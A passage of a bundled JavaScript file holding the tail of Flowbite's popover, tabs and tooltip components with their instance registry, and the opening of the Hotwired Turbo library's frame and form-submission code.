                        if (this._triggerEl && this._targetEl && !this._initialized) {
                          this._setupEventListeners();
                          this._popperInstance = this._createPopperInstance();
                          this._initialized = true;
                        }
                      };
                      Popover2.prototype.destroy = function() {
                        var _this = this;
                        if (this._initialized) {
                          var triggerEvents = this._getTriggerEvents();
                          triggerEvents.showEvents.forEach(function(ev) {
                            _this._triggerEl.removeEventListener(ev, _this._showHandler);
                            _this._targetEl.removeEventListener(ev, _this._showHandler);
                          });
                          triggerEvents.hideEvents.forEach(function(ev) {
                            _this._triggerEl.removeEventListener(ev, _this._hideHandler);
                            _this._targetEl.removeEventListener(ev, _this._hideHandler);
                          });
                          this._removeKeydownListener();
                          this._removeClickOutsideListener();
                          if (this._popperInstance) {
                            this._popperInstance.destroy();
                          }
                          this._initialized = false;
                        }
                      };
                      Popover2.prototype.removeInstance = function() {
                        instances_1.default.removeInstance("Popover", this._instanceId);
                      };
                      Popover2.prototype.destroyAndRemoveInstance = function() {
                        this.destroy();
                        this.removeInstance();
                      };
                      Popover2.prototype._setupEventListeners = function() {
                        var _this = this;
                        var triggerEvents = this._getTriggerEvents();
                        this._showHandler = function() {
                          _this.show();
                        };
                        this._hideHandler = function() {
                          setTimeout(function() {
                            if (!_this._targetEl.matches(":hover")) {
                              _this.hide();
                            }
                          }, 100);
                        };
                        triggerEvents.showEvents.forEach(function(ev) {
                          _this._triggerEl.addEventListener(ev, _this._showHandler);
                          _this._targetEl.addEventListener(ev, _this._showHandler);
                        });
                        triggerEvents.hideEvents.forEach(function(ev) {
                          _this._triggerEl.addEventListener(ev, _this._hideHandler);
                          _this._targetEl.addEventListener(ev, _this._hideHandler);
                        });
                      };
                      Popover2.prototype._createPopperInstance = function() {
                        return (0, core_1.createPopper)(this._triggerEl, this._targetEl, {
                          placement: this._options.placement,
                          modifiers: [
                            {
                              name: "offset",
                              options: {
                                offset: [0, this._options.offset]
                              }
                            }
                          ]
                        });
                      };
                      Popover2.prototype._getTriggerEvents = function() {
                        switch (this._options.triggerType) {
                          case "hover":
                            return {
                              showEvents: ["mouseenter", "focus"],
                              hideEvents: ["mouseleave", "blur"]
                            };
                          case "click":
                            return {
                              showEvents: ["click", "focus"],
                              hideEvents: ["focusout", "blur"]
                            };
                          case "none":
                            return {
                              showEvents: [],
                              hideEvents: []
                            };
                          default:
                            return {
                              showEvents: ["mouseenter", "focus"],
                              hideEvents: ["mouseleave", "blur"]
                            };
                        }
                      };
                      Popover2.prototype._setupKeydownListener = function() {
                        var _this = this;
                        this._keydownEventListener = function(ev) {
                          if (ev.key === "Escape") {
                            _this.hide();
                          }
                        };
                        document.body.addEventListener("keydown", this._keydownEventListener, true);
                      };
                      Popover2.prototype._removeKeydownListener = function() {
                        document.body.removeEventListener("keydown", this._keydownEventListener, true);
                      };
                      Popover2.prototype._setupClickOutsideListener = function() {
                        var _this = this;
                        this._clickOutsideEventListener = function(ev) {
                          _this._handleClickOutside(ev, _this._targetEl);
                        };
                        document.body.addEventListener("click", this._clickOutsideEventListener, true);
                      };
                      Popover2.prototype._removeClickOutsideListener = function() {
                        document.body.removeEventListener("click", this._clickOutsideEventListener, true);
                      };
                      Popover2.prototype._handleClickOutside = function(ev, targetEl) {
                        var clickedEl = ev.target;
                        if (clickedEl !== targetEl && !targetEl.contains(clickedEl) && !this._triggerEl.contains(clickedEl) && this.isVisible()) {
                          this.hide();
                        }
                      };
                      Popover2.prototype.isVisible = function() {
                        return this._visible;
                      };
                      Popover2.prototype.toggle = function() {
                        if (this.isVisible()) {
                          this.hide();
                        } else {
                          this.show();
                        }
                        this._options.onToggle(this);
                      };
                      Popover2.prototype.show = function() {
                        this._targetEl.classList.remove("opacity-0", "invisible");
                        this._targetEl.classList.add("opacity-100", "visible");
                        this._popperInstance.setOptions(function(options) {
                          return __assign(__assign({}, options), { modifiers: __spreadArray(__spreadArray([], options.modifiers, true), [
                            { name: "eventListeners", enabled: true }
                          ], false) });
                        });
                        this._setupClickOutsideListener();
                        this._setupKeydownListener();
                        this._popperInstance.update();
                        this._visible = true;
                        this._options.onShow(this);
                      };
                      Popover2.prototype.hide = function() {
                        this._targetEl.classList.remove("opacity-100", "visible");
                        this._targetEl.classList.add("opacity-0", "invisible");
                        this._popperInstance.setOptions(function(options) {
                          return __assign(__assign({}, options), { modifiers: __spreadArray(__spreadArray([], options.modifiers, true), [
                            { name: "eventListeners", enabled: false }
                          ], false) });
                        });
                        this._removeClickOutsideListener();
                        this._removeKeydownListener();
                        this._visible = false;
                        this._options.onHide(this);
                      };
                      return Popover2;
                    }()
                  );
                  function initPopovers() {
                    document.querySelectorAll("[data-popover-target]").forEach(function($triggerEl) {
                      var popoverID = $triggerEl.getAttribute("data-popover-target");
                      var $popoverEl = document.getElementById(popoverID);
                      if ($popoverEl) {
                        var triggerType = $triggerEl.getAttribute("data-popover-trigger");
                        var placement = $triggerEl.getAttribute("data-popover-placement");
                        var offset = $triggerEl.getAttribute("data-popover-offset");
                        new Popover($popoverEl, $triggerEl, {
                          placement: placement ? placement : Default.placement,
                          offset: offset ? parseInt(offset) : Default.offset,
                          triggerType: triggerType ? triggerType : Default.triggerType
                        });
                      } else {
                        console.error('The popover element with id "'.concat(popoverID, '" does not exist. Please check the data-popover-target attribute.'));
                      }
                    });
                  }
                  exports3.initPopovers = initPopovers;
                  if (typeof window !== "undefined") {
                    window.Popover = Popover;
                    window.initPopovers = initPopovers;
                  }
                  exports3["default"] = Popover;
                }
              ),
              /***/
              247: (
                /***/
                function(__unused_webpack_module, exports3, __webpack_require__2) {
                  var __assign = this && this.__assign || function() {
                    __assign = Object.assign || function(t) {
                      for (var s, i = 1, n = arguments.length; i < n; i++) {
                        s = arguments[i];
                        for (var p in s)
                          if (Object.prototype.hasOwnProperty.call(s, p))
                            t[p] = s[p];
                      }
                      return t;
                    };
                    return __assign.apply(this, arguments);
                  };
                  Object.defineProperty(exports3, "__esModule", { value: true });
                  exports3.initTabs = void 0;
                  var instances_1 = __webpack_require__2(423);
                  var Default = {
                    defaultTabId: null,
                    activeClasses: "text-blue-600 hover:text-blue-600 dark:text-blue-500 dark:hover:text-blue-500 border-blue-600 dark:border-blue-500",
                    inactiveClasses: "dark:border-transparent text-gray-500 hover:text-gray-600 dark:text-gray-400 border-gray-100 hover:border-gray-300 dark:border-gray-700 dark:hover:text-gray-300",
                    onShow: function() {
                    }
                  };
                  var DefaultInstanceOptions = {
                    id: null,
                    override: true
                  };
                  var Tabs = (
                    /** @class */
                    function() {
                      function Tabs2(tabsEl, items, options, instanceOptions) {
                        if (tabsEl === void 0) {
                          tabsEl = null;
                        }
                        if (items === void 0) {
                          items = [];
                        }
                        if (options === void 0) {
                          options = Default;
                        }
                        if (instanceOptions === void 0) {
                          instanceOptions = DefaultInstanceOptions;
                        }
                        this._instanceId = instanceOptions.id ? instanceOptions.id : tabsEl.id;
                        this._tabsEl = tabsEl;
                        this._items = items;
                        this._activeTab = options ? this.getTab(options.defaultTabId) : null;
                        this._options = __assign(__assign({}, Default), options);
                        this._initialized = false;
                        this.init();
                        instances_1.default.addInstance("Tabs", this, this._tabsEl.id, true);
                        instances_1.default.addInstance("Tabs", this, this._instanceId, instanceOptions.override);
                      }
                      Tabs2.prototype.init = function() {
                        var _this = this;
                        if (this._items.length && !this._initialized) {
                          if (!this._activeTab) {
                            this.setActiveTab(this._items[0]);
                          }
                          this.show(this._activeTab.id, true);
                          this._items.map(function(tab) {
                            tab.triggerEl.addEventListener("click", function() {
                              _this.show(tab.id);
                            });
                          });
                        }
                      };
                      Tabs2.prototype.destroy = function() {
                        if (this._initialized) {
                          this._initialized = false;
                        }
                      };
                      Tabs2.prototype.removeInstance = function() {
                        this.destroy();
                        instances_1.default.removeInstance("Tabs", this._instanceId);
                      };
                      Tabs2.prototype.destroyAndRemoveInstance = function() {
                        this.destroy();
                        this.removeInstance();
                      };
                      Tabs2.prototype.getActiveTab = function() {
                        return this._activeTab;
                      };
                      Tabs2.prototype.setActiveTab = function(tab) {
                        this._activeTab = tab;
                      };
                      Tabs2.prototype.getTab = function(id) {
                        return this._items.filter(function(t) {
                          return t.id === id;
                        })[0];
                      };
                      Tabs2.prototype.show = function(id, forceShow) {
                        var _a, _b;
                        var _this = this;
                        if (forceShow === void 0) {
                          forceShow = false;
                        }
                        var tab = this.getTab(id);
                        if (tab === this._activeTab && !forceShow) {
                          return;
                        }
                        this._items.map(function(t) {
                          var _a2, _b2;
                          if (t !== tab) {
                            (_a2 = t.triggerEl.classList).remove.apply(_a2, _this._options.activeClasses.split(" "));
                            (_b2 = t.triggerEl.classList).add.apply(_b2, _this._options.inactiveClasses.split(" "));
                            t.targetEl.classList.add("hidden");
                            t.triggerEl.setAttribute("aria-selected", "false");
                          }
                        });
                        (_a = tab.triggerEl.classList).add.apply(_a, this._options.activeClasses.split(" "));
                        (_b = tab.triggerEl.classList).remove.apply(_b, this._options.inactiveClasses.split(" "));
                        tab.triggerEl.setAttribute("aria-selected", "true");
                        tab.targetEl.classList.remove("hidden");
                        this.setActiveTab(tab);
                        this._options.onShow(this, tab);
                      };
                      return Tabs2;
                    }()
                  );
                  function initTabs() {
                    document.querySelectorAll("[data-tabs-toggle]").forEach(function($parentEl) {
                      var tabItems = [];
                      var defaultTabId = null;
                      $parentEl.querySelectorAll('[role="tab"]').forEach(function($triggerEl) {
                        var isActive = $triggerEl.getAttribute("aria-selected") === "true";
                        var tab = {
                          id: $triggerEl.getAttribute("data-tabs-target"),
                          triggerEl: $triggerEl,
                          targetEl: document.querySelector($triggerEl.getAttribute("data-tabs-target"))
                        };
                        tabItems.push(tab);
                        if (isActive) {
                          defaultTabId = tab.id;
                        }
                      });
                      new Tabs($parentEl, tabItems, {
                        defaultTabId
                      });
                    });
                  }
                  exports3.initTabs = initTabs;
                  if (typeof window !== "undefined") {
                    window.Tabs = Tabs;
                    window.initTabs = initTabs;
                  }
                  exports3["default"] = Tabs;
                }
              ),
              /***/
              671: (
                /***/
                function(__unused_webpack_module, exports3, __webpack_require__2) {
                  var __assign = this && this.__assign || function() {
                    __assign = Object.assign || function(t) {
                      for (var s, i = 1, n = arguments.length; i < n; i++) {
                        s = arguments[i];
                        for (var p in s)
                          if (Object.prototype.hasOwnProperty.call(s, p))
                            t[p] = s[p];
                      }
                      return t;
                    };
                    return __assign.apply(this, arguments);
                  };
                  var __spreadArray = this && this.__spreadArray || function(to, from, pack) {
                    if (pack || arguments.length === 2)
                      for (var i = 0, l = from.length, ar; i < l; i++) {
                        if (ar || !(i in from)) {
                          if (!ar)
                            ar = Array.prototype.slice.call(from, 0, i);
                          ar[i] = from[i];
                        }
                      }
                    return to.concat(ar || Array.prototype.slice.call(from));
                  };
                  Object.defineProperty(exports3, "__esModule", { value: true });
                  exports3.initTooltips = void 0;
                  var core_1 = __webpack_require__2(853);
                  var instances_1 = __webpack_require__2(423);
                  var Default = {
                    placement: "top",
                    triggerType: "hover",
                    onShow: function() {
                    },
                    onHide: function() {
                    },
                    onToggle: function() {
                    }
                  };
                  var DefaultInstanceOptions = {
                    id: null,
                    override: true
                  };
                  var Tooltip = (
                    /** @class */
                    function() {
                      function Tooltip2(targetEl, triggerEl, options, instanceOptions) {
                        if (targetEl === void 0) {
                          targetEl = null;
                        }
                        if (triggerEl === void 0) {
                          triggerEl = null;
                        }
                        if (options === void 0) {
                          options = Default;
                        }
                        if (instanceOptions === void 0) {
                          instanceOptions = DefaultInstanceOptions;
                        }
                        this._instanceId = instanceOptions.id ? instanceOptions.id : targetEl.id;
                        this._targetEl = targetEl;
                        this._triggerEl = triggerEl;
                        this._options = __assign(__assign({}, Default), options);
                        this._popperInstance = null;
                        this._visible = false;
                        this._initialized = false;
                        this.init();
                        instances_1.default.addInstance("Tooltip", this, this._instanceId, instanceOptions.override);
                      }
                      Tooltip2.prototype.init = function() {
                        if (this._triggerEl && this._targetEl && !this._initialized) {
                          this._setupEventListeners();
                          this._popperInstance = this._createPopperInstance();
                          this._initialized = true;
                        }
                      };
                      Tooltip2.prototype.destroy = function() {
                        var _this = this;
                        if (this._initialized) {
                          var triggerEvents = this._getTriggerEvents();
                          triggerEvents.showEvents.forEach(function(ev) {
                            _this._triggerEl.removeEventListener(ev, _this._showHandler);
                          });
                          triggerEvents.hideEvents.forEach(function(ev) {
                            _this._triggerEl.removeEventListener(ev, _this._hideHandler);
                          });
                          this._removeKeydownListener();
                          this._removeClickOutsideListener();
                          if (this._popperInstance) {
                            this._popperInstance.destroy();
                          }
                          this._initialized = false;
                        }
                      };
                      Tooltip2.prototype.removeInstance = function() {
                        instances_1.default.removeInstance("Tooltip", this._instanceId);
                      };
                      Tooltip2.prototype.destroyAndRemoveInstance = function() {
                        this.destroy();
                        this.removeInstance();
                      };
                      Tooltip2.prototype._setupEventListeners = function() {
                        var _this = this;
                        var triggerEvents = this._getTriggerEvents();
                        this._showHandler = function() {
                          _this.show();
                        };
                        this._hideHandler = function() {
                          _this.hide();
                        };
                        triggerEvents.showEvents.forEach(function(ev) {
                          _this._triggerEl.addEventListener(ev, _this._showHandler);
                        });
                        triggerEvents.hideEvents.forEach(function(ev) {
                          _this._triggerEl.addEventListener(ev, _this._hideHandler);
                        });
                      };
                      Tooltip2.prototype._createPopperInstance = function() {
                        return (0, core_1.createPopper)(this._triggerEl, this._targetEl, {
                          placement: this._options.placement,
                          modifiers: [
                            {
                              name: "offset",
                              options: {
                                offset: [0, 8]
                              }
                            }
                          ]
                        });
                      };
                      Tooltip2.prototype._getTriggerEvents = function() {
                        switch (this._options.triggerType) {
                          case "hover":
                            return {
                              showEvents: ["mouseenter", "focus"],
                              hideEvents: ["mouseleave", "blur"]
                            };
                          case "click":
                            return {
                              showEvents: ["click", "focus"],
                              hideEvents: ["focusout", "blur"]
                            };
                          case "none":
                            return {
                              showEvents: [],
                              hideEvents: []
                            };
                          default:
                            return {
                              showEvents: ["mouseenter", "focus"],
                              hideEvents: ["mouseleave", "blur"]
                            };
                        }
                      };
                      Tooltip2.prototype._setupKeydownListener = function() {
                        var _this = this;
                        this._keydownEventListener = function(ev) {
                          if (ev.key === "Escape") {
                            _this.hide();
                          }
                        };
                        document.body.addEventListener("keydown", this._keydownEventListener, true);
                      };
                      Tooltip2.prototype._removeKeydownListener = function() {
                        document.body.removeEventListener("keydown", this._keydownEventListener, true);
                      };
                      Tooltip2.prototype._setupClickOutsideListener = function() {
                        var _this = this;
                        this._clickOutsideEventListener = function(ev) {
                          _this._handleClickOutside(ev, _this._targetEl);
                        };
                        document.body.addEventListener("click", this._clickOutsideEventListener, true);
                      };
                      Tooltip2.prototype._removeClickOutsideListener = function() {
                        document.body.removeEventListener("click", this._clickOutsideEventListener, true);
                      };
                      Tooltip2.prototype._handleClickOutside = function(ev, targetEl) {
                        var clickedEl = ev.target;
                        if (clickedEl !== targetEl && !targetEl.contains(clickedEl) && !this._triggerEl.contains(clickedEl) && this.isVisible()) {
                          this.hide();
                        }
                      };
                      Tooltip2.prototype.isVisible = function() {
                        return this._visible;
                      };
                      Tooltip2.prototype.toggle = function() {
                        if (this.isVisible()) {
                          this.hide();
                        } else {
                          this.show();
                        }
                      };
                      Tooltip2.prototype.show = function() {
                        this._targetEl.classList.remove("opacity-0", "invisible");
                        this._targetEl.classList.add("opacity-100", "visible");
                        this._popperInstance.setOptions(function(options) {
                          return __assign(__assign({}, options), { modifiers: __spreadArray(__spreadArray([], options.modifiers, true), [
                            { name: "eventListeners", enabled: true }
                          ], false) });
                        });
                        this._setupClickOutsideListener();
                        this._setupKeydownListener();
                        this._popperInstance.update();
                        this._visible = true;
                        this._options.onShow(this);
                      };
                      Tooltip2.prototype.hide = function() {
                        this._targetEl.classList.remove("opacity-100", "visible");
                        this._targetEl.classList.add("opacity-0", "invisible");
                        this._popperInstance.setOptions(function(options) {
                          return __assign(__assign({}, options), { modifiers: __spreadArray(__spreadArray([], options.modifiers, true), [
                            { name: "eventListeners", enabled: false }
                          ], false) });
                        });
                        this._removeClickOutsideListener();
                        this._removeKeydownListener();
                        this._visible = false;
                        this._options.onHide(this);
                      };
                      return Tooltip2;
                    }()
                  );
                  function initTooltips() {
                    document.querySelectorAll("[data-tooltip-target]").forEach(function($triggerEl) {
                      var tooltipId = $triggerEl.getAttribute("data-tooltip-target");
                      var $tooltipEl = document.getElementById(tooltipId);
                      if ($tooltipEl) {
                        var triggerType = $triggerEl.getAttribute("data-tooltip-trigger");
                        var placement = $triggerEl.getAttribute("data-tooltip-placement");
                        new Tooltip($tooltipEl, $triggerEl, {
                          placement: placement ? placement : Default.placement,
                          triggerType: triggerType ? triggerType : Default.triggerType
                        });
                      } else {
                        console.error('The tooltip element with id "'.concat(tooltipId, '" does not exist. Please check the data-tooltip-target attribute.'));
                      }
                    });
                  }
                  exports3.initTooltips = initTooltips;
                  if (typeof window !== "undefined") {
                    window.Tooltip = Tooltip;
                    window.initTooltips = initTooltips;
                  }
                  exports3["default"] = Tooltip;
                }
              ),
              /***/
              947: (
                /***/
                function(__unused_webpack_module, exports3) {
                  Object.defineProperty(exports3, "__esModule", { value: true });
                  var Events = (
                    /** @class */
                    function() {
                      function Events2(eventType, eventFunctions) {
                        if (eventFunctions === void 0) {
                          eventFunctions = [];
                        }
                        this._eventType = eventType;
                        this._eventFunctions = eventFunctions;
                      }
                      Events2.prototype.init = function() {
                        var _this = this;
                        this._eventFunctions.forEach(function(eventFunction) {
                          if (typeof window !== "undefined") {
                            window.addEventListener(_this._eventType, eventFunction);
                          }
                        });
                      };
                      return Events2;
                    }()
                  );
                  exports3["default"] = Events;
                }
              ),
              /***/
              423: (
                /***/
                function(__unused_webpack_module, exports3) {
                  Object.defineProperty(exports3, "__esModule", { value: true });
                  var Instances = (
                    /** @class */
                    function() {
                      function Instances2() {
                        this._instances = {
                          Accordion: {},
                          Carousel: {},
                          Collapse: {},
                          Dial: {},
                          Dismiss: {},
                          Drawer: {},
                          Dropdown: {},
                          Modal: {},
                          Popover: {},
                          Tabs: {},
                          Tooltip: {},
                          InputCounter: {}
                        };
                      }
                      Instances2.prototype.addInstance = function(component, instance, id, override) {
                        if (override === void 0) {
                          override = false;
                        }
                        if (!this._instances[component]) {
                          console.warn("Flowbite: Component ".concat(component, " does not exist."));
                          return false;
                        }
                        if (this._instances[component][id] && !override) {
                          console.warn("Flowbite: Instance with ID ".concat(id, " already exists."));
                          return;
                        }
                        if (override && this._instances[component][id]) {
                          this._instances[component][id].destroyAndRemoveInstance();
                        }
                        this._instances[component][id ? id : this._generateRandomId()] = instance;
                      };
                      Instances2.prototype.getAllInstances = function() {
                        return this._instances;
                      };
                      Instances2.prototype.getInstances = function(component) {
                        if (!this._instances[component]) {
                          console.warn("Flowbite: Component ".concat(component, " does not exist."));
                          return false;
                        }
                        return this._instances[component];
                      };
                      Instances2.prototype.getInstance = function(component, id) {
                        if (!this._componentAndInstanceCheck(component, id)) {
                          return;
                        }
                        if (!this._instances[component][id]) {
                          console.warn("Flowbite: Instance with ID ".concat(id, " does not exist."));
                          return;
                        }
                        return this._instances[component][id];
                      };
                      Instances2.prototype.destroyAndRemoveInstance = function(component, id) {
                        if (!this._componentAndInstanceCheck(component, id)) {
                          return;
                        }
                        this.destroyInstanceObject(component, id);
                        this.removeInstance(component, id);
                      };
                      Instances2.prototype.removeInstance = function(component, id) {
                        if (!this._componentAndInstanceCheck(component, id)) {
                          return;
                        }
                        delete this._instances[component][id];
                      };
                      Instances2.prototype.destroyInstanceObject = function(component, id) {
                        if (!this._componentAndInstanceCheck(component, id)) {
                          return;
                        }
                        this._instances[component][id].destroy();
                      };
                      Instances2.prototype.instanceExists = function(component, id) {
                        if (!this._instances[component]) {
                          return false;
                        }
                        if (!this._instances[component][id]) {
                          return false;
                        }
                        return true;
                      };
                      Instances2.prototype._generateRandomId = function() {
                        return Math.random().toString(36).substr(2, 9);
                      };
                      Instances2.prototype._componentAndInstanceCheck = function(component, id) {
                        if (!this._instances[component]) {
                          console.warn("Flowbite: Component ".concat(component, " does not exist."));
                          return false;
                        }
                        if (!this._instances[component][id]) {
                          console.warn("Flowbite: Instance with ID ".concat(id, " does not exist."));
                          return false;
                        }
                        return true;
                      };
                      return Instances2;
                    }()
                  );
                  var instances = new Instances();
                  exports3["default"] = instances;
                  if (typeof window !== "undefined") {
                    window.FlowbiteInstances = instances;
                  }
                }
              )
              /******/
            };
            var __webpack_module_cache__ = {};
            function __webpack_require__(moduleId) {
              var cachedModule = __webpack_module_cache__[moduleId];
              if (cachedModule !== void 0) {
                return cachedModule.exports;
              }
              var module3 = __webpack_module_cache__[moduleId] = {
                /******/
                // no module.id needed
                /******/
                // no module.loaded needed
                /******/
                exports: {}
                /******/
              };
              __webpack_modules__[moduleId].call(module3.exports, module3, module3.exports, __webpack_require__);
              return module3.exports;
            }
            !function() {
              __webpack_require__.d = function(exports3, definition) {
                for (var key in definition) {
                  if (__webpack_require__.o(definition, key) && !__webpack_require__.o(exports3, key)) {
                    Object.defineProperty(exports3, key, { enumerable: true, get: definition[key] });
                  }
                }
              };
            }();
            !function() {
              __webpack_require__.o = function(obj, prop) {
                return Object.prototype.hasOwnProperty.call(obj, prop);
              };
            }();
            !function() {
              __webpack_require__.r = function(exports3) {
                if (typeof Symbol !== "undefined" && Symbol.toStringTag) {
                  Object.defineProperty(exports3, Symbol.toStringTag, { value: "Module" });
                }
                Object.defineProperty(exports3, "__esModule", { value: true });
              };
            }();
            var __webpack_exports__ = {};
            !function() {
              var exports3 = __webpack_exports__;
              Object.defineProperty(exports3, "__esModule", { value: true });
              var accordion_1 = __webpack_require__(902);
              var carousel_1 = __webpack_require__(33);
              var collapse_1 = __webpack_require__(922);
              var dial_1 = __webpack_require__(556);
              var dismiss_1 = __webpack_require__(791);
              var drawer_1 = __webpack_require__(340);
              var dropdown_1 = __webpack_require__(316);
              var modal_1 = __webpack_require__(16);
              var popover_1 = __webpack_require__(903);
              var tabs_1 = __webpack_require__(247);
              var tooltip_1 = __webpack_require__(671);
              var input_counter_1 = __webpack_require__(656);
              __webpack_require__(311);
              var events_1 = __webpack_require__(947);
              var turboLoadEvents = new events_1.default("turbo:load", [
                accordion_1.initAccordions,
                collapse_1.initCollapses,
                carousel_1.initCarousels,
                dismiss_1.initDismisses,
                dropdown_1.initDropdowns,
                modal_1.initModals,
                drawer_1.initDrawers,
                tabs_1.initTabs,
                tooltip_1.initTooltips,
                popover_1.initPopovers,
                dial_1.initDials,
                input_counter_1.initInputCounters
              ]);
              turboLoadEvents.init();
              var turboFrameLoadEvents = new events_1.default("turbo:frame-load", [
                accordion_1.initAccordions,
                collapse_1.initCollapses,
                carousel_1.initCarousels,
                dismiss_1.initDismisses,
                dropdown_1.initDropdowns,
                modal_1.initModals,
                drawer_1.initDrawers,
                tabs_1.initTabs,
                tooltip_1.initTooltips,
                popover_1.initPopovers,
                dial_1.initDials,
                input_counter_1.initInputCounters
              ]);
              turboFrameLoadEvents.init();
              exports3["default"] = {
                Accordion: accordion_1.default,
                Carousel: carousel_1.default,
                Collapse: collapse_1.default,
                Dial: dial_1.default,
                Drawer: drawer_1.default,
                Dismiss: dismiss_1.default,
                Dropdown: dropdown_1.default,
                Modal: modal_1.default,
                Popover: popover_1.default,
                Tabs: tabs_1.default,
                Tooltip: tooltip_1.default,
                InputCounter: input_counter_1.default,
                Events: events_1.default
              };
            }();
            return __webpack_exports__;
          }()
        );
      });
    }
  });

  // node_modules/@hotwired/turbo/dist/turbo.es2017-esm.js
  var turbo_es2017_esm_exports = {};
  __export(turbo_es2017_esm_exports, {
    FetchEnctype: () => FetchEnctype,
    FetchMethod: () => FetchMethod,
    FetchRequest: () => FetchRequest,
    FetchResponse: () => FetchResponse,
    FrameElement: () => FrameElement,
    FrameLoadingStyle: () => FrameLoadingStyle,
    FrameRenderer: () => FrameRenderer,
    PageRenderer: () => PageRenderer,
    PageSnapshot: () => PageSnapshot,
    StreamActions: () => StreamActions,
    StreamElement: () => StreamElement,
    StreamSourceElement: () => StreamSourceElement,
    cache: () => cache,
    clearCache: () => clearCache,
    connectStreamSource: () => connectStreamSource,
    disconnectStreamSource: () => disconnectStreamSource,
    fetch: () => fetchWithTurboHeaders,
    fetchEnctypeFromString: () => fetchEnctypeFromString,
    fetchMethodFromString: () => fetchMethodFromString,
    isSafe: () => isSafe,
    navigator: () => navigator$1,
    registerAdapter: () => registerAdapter,
    renderStreamMessage: () => renderStreamMessage,
    session: () => session,
    setConfirmMethod: () => setConfirmMethod,
    setFormMode: () => setFormMode,
    setProgressBarDelay: () => setProgressBarDelay,
    start: () => start,
    visit: () => visit
  });
  (function(prototype3) {
    if (typeof prototype3.requestSubmit == "function")
      return;
    prototype3.requestSubmit = function(submitter) {
      if (submitter) {
        validateSubmitter(submitter, this);
        submitter.click();
      } else {
        submitter = document.createElement("input");
        submitter.type = "submit";
        submitter.hidden = true;
        this.appendChild(submitter);
        submitter.click();
        this.removeChild(submitter);
      }
    };
    function validateSubmitter(submitter, form) {
      submitter instanceof HTMLElement || raise(TypeError, "parameter 1 is not of type 'HTMLElement'");
      submitter.type == "submit" || raise(TypeError, "The specified element is not a submit button");
      submitter.form == form || raise(DOMException, "The specified element is not owned by this form element", "NotFoundError");
    }
    function raise(errorConstructor, message, name) {
      throw new errorConstructor("Failed to execute 'requestSubmit' on 'HTMLFormElement': " + message + ".", name);
    }
  })(HTMLFormElement.prototype);
  var submittersByForm = /* @__PURE__ */ new WeakMap();
  function findSubmitterFromClickTarget(target) {
    const element = target instanceof Element ? target : target instanceof Node ? target.parentElement : null;
    const candidate = element ? element.closest("input, button") : null;
    return candidate?.type == "submit" ? candidate : null;
  }
  function clickCaptured(event) {
    const submitter = findSubmitterFromClickTarget(event.target);
    if (submitter && submitter.form) {
      submittersByForm.set(submitter.form, submitter);
    }
  }
  (function() {
    if ("submitter" in Event.prototype)
      return;
    let prototype3 = window.Event.prototype;
    if ("SubmitEvent" in window) {
      const prototypeOfSubmitEvent = window.SubmitEvent.prototype;
      if (/Apple Computer/.test(navigator.vendor) && !("submitter" in prototypeOfSubmitEvent)) {
        prototype3 = prototypeOfSubmitEvent;
      } else {
        return;
      }
    }
    addEventListener("click", clickCaptured, true);
    Object.defineProperty(prototype3, "submitter", {
      get() {
        if (this.type == "submit" && this.target instanceof HTMLFormElement) {
          return submittersByForm.get(this.target);
        }
      }
    });
  })();
  var FrameLoadingStyle = {
    eager: "eager",
    lazy: "lazy"
  };
  var FrameElement = class _FrameElement extends HTMLElement {
    static delegateConstructor = void 0;
    loaded = Promise.resolve();
    static get observedAttributes() {
      return ["disabled", "complete", "loading", "src"];
    }
    constructor() {
      super();
      this.delegate = new _FrameElement.delegateConstructor(this);
    }
    connectedCallback() {
      this.delegate.connect();
    }
    disconnectedCallback() {
      this.delegate.disconnect();
    }
    reload() {
      return this.delegate.sourceURLReloaded();
    }
    attributeChangedCallback(name) {
      if (name == "loading") {
        this.delegate.loadingStyleChanged();
      } else if (name == "complete") {
        this.delegate.completeChanged();
      } else if (name == "src") {
        this.delegate.sourceURLChanged();
      } else {
        this.delegate.disabledChanged();
      }
    }
    /**
     * Gets the URL to lazily load source HTML from
     */
    get src() {
      return this.getAttribute("src");
    }
    /**
     * Sets the URL to lazily load source HTML from
     */
    set src(value) {
      if (value) {
        this.setAttribute("src", value);
      } else {
        this.removeAttribute("src");
      }
    }
    /**
     * Gets the refresh mode for the frame.
     */
    get refresh() {
      return this.getAttribute("refresh");
    }
    /**
     * Sets the refresh mode for the frame.
     */
    set refresh(value) {
      if (value) {
        this.setAttribute("refresh", value);
      } else {
        this.removeAttribute("refresh");
      }
    }
    /**
     * Determines if the element is loading
     */
    get loading() {
      return frameLoadingStyleFromString(this.getAttribute("loading") || "");
    }
    /**
     * Sets the value of if the element is loading
     */
    set loading(value) {
      if (value) {
        this.setAttribute("loading", value);
      } else {
        this.removeAttribute("loading");
      }
    }
    /**
     * Gets the disabled state of the frame.
     *
     * If disabled, no requests will be intercepted by the frame.
     */
    get disabled() {
      return this.hasAttribute("disabled");
    }
    /**
     * Sets the disabled state of the frame.
     *
     * If disabled, no requests will be intercepted by the frame.
     */
    set disabled(value) {
      if (value) {
        this.setAttribute("disabled", "");
      } else {
        this.removeAttribute("disabled");
      }
    }
    /**
     * Gets the autoscroll state of the frame.
     *
     * If true, the frame will be scrolled into view automatically on update.
     */
    get autoscroll() {
      return this.hasAttribute("autoscroll");
    }
    /**
     * Sets the autoscroll state of the frame.
     *
     * If true, the frame will be scrolled into view automatically on update.
     */
    set autoscroll(value) {
      if (value) {
        this.setAttribute("autoscroll", "");
      } else {
        this.removeAttribute("autoscroll");
      }
    }
    /**
     * Determines if the element has finished loading
     */
    get complete() {
      return !this.delegate.isLoading;
    }
    /**
     * Gets the active state of the frame.
     *
     * If inactive, source changes will not be observed.
     */
    get isActive() {
      return this.ownerDocument === document && !this.isPreview;
    }
    /**
     * Sets the active state of the frame.
     *
     * If inactive, source changes will not be observed.
     */
    get isPreview() {
      return this.ownerDocument?.documentElement?.hasAttribute("data-turbo-preview");
    }
  };
  function frameLoadingStyleFromString(style) {
    switch (style.toLowerCase()) {
      case "lazy":
        return FrameLoadingStyle.lazy;
      default:
        return FrameLoadingStyle.eager;
    }
  }
  function expandURL(locatable) {
    return new URL(locatable.toString(), document.baseURI);
  }
  function getAnchor(url) {
    let anchorMatch;
    if (url.hash) {
      return url.hash.slice(1);
    } else if (anchorMatch = url.href.match(/#(.*)$/)) {
      return anchorMatch[1];
    }
  }
  function getAction$1(form, submitter) {
    const action = submitter?.getAttribute("formaction") || form.getAttribute("action") || form.action;
    return expandURL(action);
  }
  function getExtension(url) {
    return (getLastPathComponent(url).match(/\.[^.]*$/) || [])[0] || "";
  }
  function isHTML(url) {
